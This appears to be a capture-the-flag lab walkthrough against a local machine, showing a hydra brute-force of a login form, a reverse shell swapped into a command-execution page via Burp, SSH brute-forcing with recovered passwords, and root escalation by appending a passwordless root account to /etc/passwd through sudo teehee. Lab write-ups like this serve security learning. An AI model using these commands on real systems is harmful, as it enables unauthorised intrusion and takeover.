@@ -1,0 +1,41 @@
+I see a Login page 
+
+I have a strong feeling that user id is admin but Password is bit challanging
+
+I did brute forcing with hydra
+
+hydra -l admin -P /root/Desktop/passwords 192.168.0.151 http-post-form "/login.php:username=^USER^&password=^PASS^:S=logout" -F
+
+[80][http-post-form] host: 192.168.0.151   login: admin   password: happy
+
+http://192.168.0.151/command.php
+=> Run Command -> List File
+-> now intercept post request inside BurpeSuite and change ls+-l to nc reverse shell command
+
+start Listner in our machine and wolla we got connection
+
+*****************Inside Victim Machine with low prev Shell***************
+
+Lcal users : charles  jim  sam
+
+Inside jim we have a backup folder contanning old-passwords.bak
+
+take it back to our attacker pc to bruteforce ssh
+
+ACCOUNT FOUND: [ssh] Host: 192.168.0.151 User: jim Password: jibril04 [SUCCESS]
+
+********************************************************************************
+after log in as JIM i can read mbox (Which is giving me hint to see my mail at /var/mail)
+
+I got password of charles : ^xHhA&hvim0y
+*********************************************************************************
+After login as charles I checked my sudo permissions
+=> charles can do /usr/bin/teehee as root
+
+so we can write anything inside any file
+
+=> Run echo ck::0:0:ck:/ck:/bin/bash | sudo /usr/bin/teehee -a /etc/passwd to add a root user ck
+
+su ck 
+
+Now, I got root
